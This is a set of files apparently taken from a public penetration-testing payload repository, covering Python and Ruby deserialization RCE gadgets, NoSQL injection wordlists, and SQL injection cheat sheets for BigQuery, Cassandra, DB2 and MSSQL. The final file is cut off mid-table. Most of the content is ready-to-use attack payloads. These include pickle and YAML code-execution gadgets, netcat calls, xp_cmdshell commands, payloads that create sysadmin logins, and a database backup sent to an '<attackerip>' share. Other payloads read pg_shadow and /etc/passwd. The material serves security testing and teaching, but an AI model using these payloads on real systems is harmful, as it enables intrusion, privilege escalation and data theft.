{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Insecure Deserialization/Python.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md", "content": "# Python Deserialization\n\n> Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Pickle](#pickle)\n    * [PyYAML](#pyyaml)\n* [References](#references)\n\n## Tools\n\n* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.\n\n## Methodology\n\nIn Python source code, look for these sinks:\n\n* `cPickle.loads`\n* `pickle.loads`\n* `_pickle.loads`\n* `jsonpickle.decode`\n\n### Pickle\n\nThe following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.\n:warning: `import cPickle` will only work on Python 2\n\n```python\nimport cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)\n```\n\nThe vulnerability is introduced when a token is loaded from an user input.\n\n```python\nnew_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)\n```\n\nPython 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.\n\n> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.\n\n```python\nimport cPickle, os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)\n```\n\n### PyYAML\n\nYAML deserialization is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java. YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.\n\n```yaml\n!!python/object/apply:time.sleep [10]\n!!python/object/apply:builtins.range [1, 10, 1]\n!!python/object/apply:os.system [\"nc 10.10.10.10 4242\"]\n!!python/object/apply:os.popen [\"nc 10.10.10.10 4242\"]\n!!python/object/new:subprocess [[\"ls\",\"-ail\"]]\n!!python/object/new:subprocess.check_output [[\"ls\",\"-ail\"]]\n```\n\n```yaml\n!!python/object/apply:subprocess.Popen\n- ls\n```\n\n```yaml\n!!python/object/new:str\nstate: !!python/tuple\n- 'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'\n- !!python/object/new:Warning\n  state:\n    update: !!python/name:exec\n```\n\nSince PyYaml version 6.0, the default loader for `load` has been switched to SafeLoader mitigating the risks against Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)\n\nThe vulnerable sinks are now `yaml.unsafe_load` and `yaml.load(input, Loader=yaml.UnsafeLoader)`.\n\n```py\nwith open('exploit_unsafeloader.yml') as file:\n        data = yaml.load(file,Loader=yaml.UnsafeLoader)\n```\n\n## References\n\n* [CVE-2019-20477 - 0Day YAML Deserialization Attack on PyYAML version <= 5.1.2 - Manmeet Singh (@_j0lt) - June 21, 2020](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)\n* [Exploiting misuse of Python's \"pickle\" - Nelson Elhage - March 20, 2011](https://blog.nelhage.com/2011/03/exploiting-pickle/)\n* [Python Yaml Deserialization - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)\n* [PyYAML Documentation - PyYAML - April 29, 2006](https://pyyaml.org/wiki/PyYAMLDocumentation)\n* [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13, 2021](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)\n", "timestamp": "2025-10-21T13:30:03.137974"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "Insecure Deserialization/Ruby.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md", "content": "# Ruby Deserialization\n\n> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.\n\n## Summary\n\n* [Marshal Deserialization](#marshal-deserialization)\n* [YAML Deserialization](#yaml-deserialization)\n* [References](#references)\n\n## Marshal Deserialization\n\nScript to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5\n\n```ruby\nfor i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done\n```\n\n## YAML Deserialization\n\nVulnerable code\n\n```ruby\nrequire \"yaml\"\nYAML.load(File.read(\"p.yml\"))\n```\n\nUniversal gadget for ruby <= 2.7.2:\n\n```yaml\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n  - !ruby/object:Gem::Source::SpecificFile\n    spec: &1 !ruby/object:Gem::StubSpecification\n      loaded_from: \"|id 1>&2\"\n  - !ruby/object:Gem::Source::SpecificFile\n      spec:\n```\n\nUniversal gadget for ruby 2.x - 3.x.\n\n```yaml\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: id\n         method_id: :resolve\n```\n\n```yaml\n ---\n - !ruby/object:Gem::Installer\n     i: x\n - !ruby/object:Gem::SpecFetcher\n     i: y\n - !ruby/object:Gem::Requirement\n   requirements:\n     !ruby/object:Gem::Package::TarReader\n     io: &1 !ruby/object:Net::BufferedIO\n       io: &1 !ruby/object:Gem::Package::TarReader::Entry\n          read: 0\n          header: \"abc\"\n       debug_output: &1 !ruby/object:Net::WriteAdapter\n          socket: &1 !ruby/object:Gem::RequestSet\n              sets: !ruby/object:Net::WriteAdapter\n                  socket: !ruby/module 'Kernel'\n                  method_id: :system\n              git_set: sleep 600\n          method_id: :resolve \n```\n\n## References\n\n* [Ruby 2.X Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 8, 2018](https://www.elttam.com.au/blog/ruby-deserialization/)\n* [Universal RCE with Ruby YAML.load - Etienne Stalmans (@_staaldraad) - March 2, 2019](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)\n* [Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab - 2024](https://pentesterlab.com/exercises/ruby_ugadget/course)\n* [Universal RCE with Ruby YAML.load (versions > 2.7) - Etienne Stalmans (@_staaldraad) - January 9, 2021](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)\n* [Blind Remote Code Execution through YAML Deserialization - Colin McQueen - June 9, 2021](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)\n", "timestamp": "2025-10-21T13:30:03.310368"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "NoSQL Injection/Intruder/MongoDB.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/MongoDB.txt", "content": "true, $where: '1 == 1'\n, $where: '1 == 1'\n$where: '1 == 1'\n', $where: '1 == 1'\n1, $where: '1 == 1'\n{ $ne: 1 }\n', $or: [ {}, { 'a':'a\n' } ], $comment:'successful MongoDB injection'\ndb.injection.insert({success:1});\ndb.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1\n|| 1==1\n' && this.password.match(/.*/)//+%00\n' && this.passwordzz.match(/.*/)//+%00\n'%20%26%26%20this.password.match(/.*/)//+%00\n'%20%26%26%20this.passwordzz.match(/.*/)//+%00\n{$gt: ''}\n[$ne]=1\n';return 'a'=='a' && ''=='\n\";return(true);var xyz='a\n0;return true", "timestamp": "2025-10-21T13:30:08.685286"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "NoSQL Injection/Intruder/NoSQL.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt", "content": "true, $where: '1 == 1'\n, $where: '1 == 1'\n$where: '1 == 1'\n', $where: '1 == 1'\n1, $where: '1 == 1'\n{ $ne: 1 }\n', $or: [ {}, { 'a':'a\n' } ], $comment:'successful MongoDB injection'\ndb.injection.insert({success:1});\ndb.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1\n|| 1==1\n' && this.password.match(/.*/)//+%00\n' && this.passwordzz.match(/.*/)//+%00\n'%20%26%26%20this.password.match(/.*/)//+%00\n'%20%26%26%20this.passwordzz.match(/.*/)//+%00\n{$gt: ''}\n{\"$gt\": \"\"}\n[$ne]=1\n';sleep(5000);\n';sleep(5000);'\n';sleep(5000);+'\n';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);\n';return 'a'=='a' && ''=='\n\";return(true);var xyz='a\n0;return true\n{\"&exists\":false}\n", "timestamp": "2025-10-21T13:30:08.784380"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/BigQuery Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/BigQuery%20Injection.md", "content": "# Google BigQuery SQL Injection\r\n\r\n> Google BigQuery SQL Injection  is a type of security vulnerability where an attacker can execute arbitrary SQL queries on a Google BigQuery database by manipulating user inputs that are incorporated into SQL queries without proper sanitization. This can lead to unauthorized data access, data manipulation, or other malicious activities.\r\n\r\n## Summary\r\n\r\n* [Detection](#detection)\r\n* [BigQuery Comment](#bigquery-comment)\r\n* [BigQuery Union Based](#bigquery-union-based)\r\n* [BigQuery Error Based](#bigquery-error-based)\r\n* [BigQuery Boolean Based](#bigquery-boolean-based)\r\n* [BigQuery Time Based](#bigquery-time-based)\r\n* [References](#references)\r\n\r\n## Detection\r\n\r\n* Use a classic single quote to trigger an error: `'`\r\n* Identify BigQuery using backtick notation: ```SELECT .... FROM `` AS ...```\r\n\r\n| SQL Query                                             | Description |\r\n| ----------------------------------------------------- | -------------------- |\r\n| `SELECT @@project_id`                                 | Gathering project id |\r\n| `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |\r\n| `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |\r\n\r\n## BigQuery Comment\r\n\r\n| Type                       | Description                       |\r\n|----------------------------|-----------------------------------|\r\n| `#`                        | Hash comment                      |\r\n| `/* PostgreSQL Comment */` | C-style comment                   |\r\n\r\n## BigQuery Union Based\r\n\r\n```ps1\r\nUNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\r\ntrue) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\r\ntrue) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\r\n' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#\r\n```\r\n\r\n## BigQuery Error Based\r\n\r\n| SQL Query                                                | Description          |\r\n| -------------------------------------------------------- | -------------------- |\r\n| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |\r\n| `select CAST(@@project_id AS INT64)`                     | Casting              |\r\n\r\n## BigQuery Boolean Based\r\n\r\n```ps1\r\n' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#\r\n```\r\n\r\n## BigQuery Time Based\r\n\r\n* Time based functions does not exist in the BigQuery syntax.\r\n\r\n## References\r\n\r\n* [BigQuery SQL Injection Cheat Sheet - Ozgur Alp - February 14, 2022](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)\r\n* [BigQuery Documentation - Query Syntax - October 30, 2024](https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)\r\n* [BigQuery Documentation - Functions and Operators - October 30, 2024](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)\r\n* [Akamai Web Application Firewall Bypass Journey: Exploiting “Google BigQuery” SQL Injection Vulnerability - Duc Nguyen - March 31, 2020](https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)\r\n", "timestamp": "2025-10-21T13:30:15.631907"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/Cassandra Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md", "content": "# Cassandra Injection\n\n> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system.\n\n## Summary\n\n* [CQL Injection Limitations](#cql-injection-limitations)\n* [Cassandra Comment](#cassandra-comment)\n* [Cassandra Login Bypass](#cassandra-login-bypass)\n    * [Example #1](#example-1)\n    * [Example #2](#example-2)\n* [References](#references)\n\n## CQL Injection Limitations\n\n* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging.\n\n* Additionally, Cassandra lacks convenient built-in functions like `DATABASE()` or `USER()` for retrieving database metadata.\n\n* Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected.\n\n* Time-based SQL injections, which typically rely on functions like `SLEEP()` to introduce a delay, are also difficult to execute in CQL since it doesn’t include a `SLEEP()` function.\n\n* CQL does not allow subqueries or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would be rejected.\n\n## Cassandra Comment\n\n```sql\n/* Cassandra Comment */\n```\n\n## Cassandra Login Bypass\n\n### Example #1\n\n```sql\nusername: admin' ALLOW FILTERING; %00\npassword: ANY\n```\n\n### Example #2\n\n```sql\nusername: admin'/*\npassword: */and pass>'\n```\n\nThe injection would look like the following SQL query\n\n```sql\nSELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;\n```\n\n## References\n\n* [Cassandra injection vulnerability triggered - DATADOG - January 30, 2023](https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)\n* [Investigating CQL injection in Apache Cassandra - Mehmet Leblebici - December 2, 2022](https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra/)\n", "timestamp": "2025-10-21T13:30:15.729651"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/DB2 Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md", "content": "# DB2 Injection\r\n\r\n> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed systems, cloud environments, and hybrid deployments.\r\n\r\n## Summary\r\n\r\n* [DB2 Comments](#db2-comments)\r\n* [DB2 Default Databases](#db2-default-databases)\r\n* [DB2 Enumeration](#db2-enumeration)\r\n* [DB2 Methodology](#db2-methodology)\r\n* [DB2 Error Based](#db2-error-based)\r\n* [DB2 Blind Based](#db2-blind-based)\r\n* [DB2 Time Based](#db2-time-based)\r\n* [DB2 Command Execution](#db2-command-execution)\r\n* [DB2 WAF Bypass](#db2-waf-bypass)\r\n* [DB2 Accounts and Privileges](#db2-accounts-and-privileges)\r\n* [References](#references)\r\n\r\n## DB2 Comments\r\n\r\n| Type                       | Description                       |\r\n| -------------------------- | --------------------------------- |\r\n| `--`                       | SQL comment                       |\r\n\r\n## DB2 Default Databases\r\n\r\n| Name        | Description                                                           |\r\n| ----------- | --------------------------------------------------------------------- |\r\n| SYSIBM      | Core system catalog tables storing metadata for database objects.     |\r\n| SYSCAT      | User-friendly views for accessing metadata in the SYSIBM tables.      |\r\n| SYSSTAT     | Statistics tables used by the DB2 optimizer for query optimization.   |\r\n| SYSPUBLIC   | Metadata about objects available to all users (granted to PUBLIC).    |\r\n| SYSIBMADM   | Administrative views for monitoring and managing the database system. |\r\n| SYSTOOLs    | Tools, utilities, and auxiliary objects provided for database administration and troubleshooting. |\r\n\r\n## DB2 Enumeration\r\n\r\n| Description      | SQL Query |\r\n| ---------------- | ----------------------------------------- |\r\n| DBMS version     | `select versionnumber, version_timestamp from sysibm.sysversions;` |\r\n| DBMS version     | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |\r\n| DBMS version     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |\r\n| DBMS version     | `select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo` |\r\n| DBMS version     | `select service_level,bld_level from sysibmadm.env_inst_info` |\r\n| Current user     | `select user from sysibm.sysdummy1` |\r\n| Current user     | `select session_user from sysibm.sysdummy1` |\r\n| Current user     | `select system_user from sysibm.sysdummy1` |\r\n| Current database | `select current server from sysibm.sysdummy1` |\r\n| OS info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info` |\r\n\r\n## DB2 Methodology\r\n\r\n| Description      | SQL Query |\r\n| ---------------- | ------------------------------------ |\r\n| List databases   | `SELECT distinct(table_catalog) FROM sysibm.tables` |\r\n| List databases   | `SELECT schemaname FROM syscat.schemata;` |\r\n| List columns     | `SELECT name, tbname, coltype FROM sysibm.syscolumns` |\r\n| List tables      | `SELECT table_name FROM sysibm.tables` |\r\n| List tables      | `SELECT name FROM sysibm.systables` |\r\n| List tables      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |\r\n\r\n## DB2 Error Based\r\n\r\n```sql\r\n-- Returns all in one xml-formatted string\r\nselect xmlagg(xmlrow(table_schema)) from sysibm.tables\r\n\r\n-- Same but without repeated elements\r\nselect xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)\r\n\r\n-- Returns all in one xml-formatted string.\r\n-- May need CAST(xml2clob(… AS varchar(500)) to display the result.\r\nselect xml2clob(xmelement(name t, table_schema)) from sysibm.tables \r\n```\r\n\r\n## DB2 Blind Based\r\n\r\n| Description      | SQL Query |\r\n| ---------------- | ------------------------------------------ |\r\n| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1` |\r\n| ASCII value      | `select chr(65) from sysibm.sysdummy1`     |\r\n| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`  |\r\n| Select Nth Row   | `select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only` |\r\n| Bitwise AND      | `select bitand(1,0) from sysibm.sysdummy1` |\r\n| Bitwise AND NOT  | `select bitandnot(1,0) from sysibm.sysdummy1` |\r\n| Bitwise OR       | `select bitor(1,0) from sysibm.sysdummy1`  |\r\n| Bitwise XOR      | `select bitxor(1,0) from sysibm.sysdummy1` |\r\n| Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1` |\r\n\r\n## DB2 Time Based\r\n\r\nHeavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.\r\n\r\n```sql\r\n' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 \r\n```\r\n\r\n## DB2 Command Execution\r\n\r\n> The QSYS2.QCMDEXC() procedure and scalar function can be used to execute IBM i CL commands.\r\n\r\nUsing the `QSYS2.QCMDEXC()` on IBM i (previously named AS-400), it is possibile to achieve command execution.\r\n\r\n```sql\r\n'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')\r\n```\r\n\r\n## DB2 WAF Bypass\r\n\r\n### Avoiding Quotes\r\n\r\n```sql\r\nSELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1\r\n```\r\n\r\n## DB2 Accounts and Privileges\r\n\r\n| Description      | SQL Query |\r\n| ---------------- | ------------------------------------ |\r\n| List users | `select distinct(grantee) from sysibm.systabauth` |\r\n| List users | `select distinct(definer) from syscat.schemata` |\r\n| List users | `select distinct(authid) from sysibmadm.privileges` |\r\n| List users | `select grantee from syscat.dbauth` |\r\n| List privileges | `select * from syscat.tabauth` |\r\n| List privileges | `select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies` |\r\n| List DBA accounts | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'` |\r\n| List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |\r\n| Location of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |\r\n\r\n## References\r\n\r\n* [DB2 SQL injection cheat sheet - Adrián - May 20, 2012](https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)\r\n* [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)\r\n* [QSYS2.QCMDEXC() - IBM Support - April 22, 2023](https://www.ibm.com/support/pages/qsys2qcmdexc)\r\n", "timestamp": "2025-10-21T13:30:15.843116"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/Intruder/FUZZDB_MSSQL.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/FUZZDB_MSSQL.txt", "content": "# you will need to customize/modify some of the values in the queries for best effect\n'; exec master..xp_cmdshell 'ping 10.10.1.2'--\n'create user name identified by 'pass123' --\n'create user name identified by pass123 temporary tablespace temp default tablespace users; \n' ; drop table temp --\n'exec sp_addlogin 'name' , 'password' --\n' exec sp_addsrvrolemember 'name' , 'sysadmin' --\n' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --\n' grant connect to name; grant resource to name; --\n' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)\n' or 1=1 --\n' union (select @@version) --\n' union (select NULL, (select @@version)) --\n' union (select NULL, NULL, (select @@version)) --\n' union (select NULL, NULL, NULL,  (select @@version)) --\n' union (select NULL, NULL, NULL, NULL,  (select @@version)) --\n' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --\n", "timestamp": "2025-10-21T13:30:16.565384"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt", "content": "# ms-sqli info disclosure payload fuzzfile\n# replace regex with your fuzzer for best results <attackerip> <sharename>\n# run wireshark or tcpdump, look for incoming smb or icmp packets from victim\n# might need to terminate payloads with ;--\nselect @@version\nselect @@servernamee\nselect @@microsoftversione\nselect * from master..sysserverse\nselect * from sysusers\nexec master..xp_cmdshell 'ipconfig+/all'\t\nexec master..xp_cmdshell 'net+view'\nexec master..xp_cmdshell 'net+users'\nexec master..xp_cmdshell 'ping+<attackerip>'\nBACKUP database master to disks='\\\\<attackerip>\\<attackerip>\\backupdb.dat'\ncreate table myfile (line varchar(8000))\" bulk insert foo from 'c:\\inetpub\\wwwroot\\auth.asp‚'\" select * from myfile\"--\n", "timestamp": "2025-10-21T13:30:16.808470"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/FUZZDB_Postgres_Enumeration.txt", "content": "# info disclosure payload fuzzfile for pgsql\nselect version();\t\nselect current_database();\nselect current_user;\nselect session_user;\nselect current_setting('log_connections');\nselect current_setting('log_statement');\nselect current_setting('port');\nselect current_setting('password_encryption');\nselect current_setting('krb_server_keyfile');\nselect current_setting('virtual_host');\nselect current_setting('port');\nselect current_setting('config_file');\nselect current_setting('hba_file');\nselect current_setting('data_directory');\nselect * from pg_shadow;\nselect * from pg_group;\ncreate table myfile (input TEXT);\ncopy myfile from '/etc/passwd'; \nselect * from myfile;copy myfile to /tmp/test;\n", "timestamp": "2025-10-21T13:30:17.349925"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/MSSQL Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md", "content": "# MSSQL Injection\n\n> MSSQL Injection  is a type of security vulnerability that can occur when an attacker can insert or \"inject\" malicious SQL code into a query executed by a Microsoft SQL Server (MSSQL) database. This typically happens when user inputs are directly included in SQL queries without proper sanitization or parameterization. SQL Injection can lead to serious consequences such as unauthorized data access, data manipulation, and even gaining control over the database server.\n\n## Summary\n\n* [MSSQL Default Databases](#mssql-default-databases)\n* [MSSQL Comments](#mssql-comments)\n* [MSSQL Enumeration](#mssql-enumeration)\n    * [MSSQL List Databases](#mssql-list-databases)\n    * [MSSQL List Tables](#mssql-list-tables)\n    * [MSSQL List Columns](#mssql-list-columns)\n* [MSSQL Union Based](#mssql-union-based)\n* [MSSQL Error Based](#mssql-error-based)\n* [MSSQL Blind Based](#mssql-blind-based)\n    * [MSSQL Blind With Substring Equivalent](#mssql-blind-with-substring-equivalent)\n* [MSSQL Time Based](#mssql-time-based)\n* [MSSQL Stacked Query](#mssql-stacked-query)\n* [MSSQL File Manipulation](#mssql-file-manipulation)\n    * [MSSQL Read File](#mssql-read-file)\n    * [MSSQL Write File](#mssql-write-file)\n* [MSSQL Command Execution](#mssql-command-execution)\n    * [XP_CMDSHELL](#xp_cmdshell)\n    * [Python Script](#python-script)\n* [MSSQL Out of Band](#mssql-out-of-band)\n    * [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)\n    * [MSSQL UNC Path](#mssql-unc-path)\n* [MSSQL Trusted Links](#mssql-trusted-links)\n* [MSSQL Privileges](#mssql-privileges)\n    * [MSSQL List Permissions](#mssql-list-permissions)\n    * [MSSQL Make User DBA](#mssql-make-user-dba)\n* [MSSQL Database Credentials](#mssql-database-credentials)\n* [MSSQL OPSEC](#mssql-opsec)\n* [References](#references)\n\n## MSSQL Default Databases\n\n| Name                  | Description                           |\n|-----------------------|---------------------------------------|\n| pubs                 | Not available on MSSQL 2005           |\n| model                 | Available in all versions             |\n| msdb                 | Available in all versions             |\n| tempdb             | Available in all versions             |\n| northwind             | Available in all versions             |\n| information_schema | Available from MSSQL 2000 and higher  |\n\n## MSSQL Comments\n\n| Type                       | Description                       |\n|----------------------------|-----------------------------------|\n| `/* MSSQL Comment */`      | C-style comment                   |\n| `--`                       | SQL comment                       |\n| `;%00`                     | Null byte                         |\n\n## MSSQL Enumeration\n\n| Description     | SQL Query |\n| --------------- | ----------------------------------------- |\n| DBMS version    | `SELECT @@version`                        |\n| Database name   | `SELECT DB_NAME()`                        |\n| Database schema | `SELECT SCHEMA_NAME()`                    |\n| Hostname        | `SELECT HOST_NAME()`                      |\n| Hostname        | `SELECT @@hostname`                       |\n| Hostname        | `SELECT @@SERVERNAME`                     |\n| Hostname        | `SELECT SERVERPROPERTY('productversion')` |\n| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |\n| Hostname        | `SELECT SERVERPROPERTY('edition')`        |\n| User            | `SELECT CURRENT_USER`                     |\n| User            | `SELECT user_name();`                     |\n| User            | `SELECT system_user;`                     |\n| User            | `SELECT user;`                            |\n\n### MSSQL List Databases\n\n```sql\nSELECT name FROM master..sysdatabases;\nSELECT name FROM master.sys.databases;\n\n-- for N = 0, 1, 2, …\nSELECT DB_NAME(N); \n\n-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb \n-- (Only works in MSSQL 2017+)\nSELECT STRING_AGG(name, ', ') FROM master..sysdatabases; \n```\n\n### MSSQL List Tables\n\n```sql\n-- use xtype = 'V' for views\nSELECT name FROM master..sysobjects WHERE xtype = 'U';\nSELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'\nSELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';\n\n-- list column names and types for master..sometable\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';\n\nSELECT table_catalog, table_name FROM information_schema.columns\nSELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'\n\n-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, 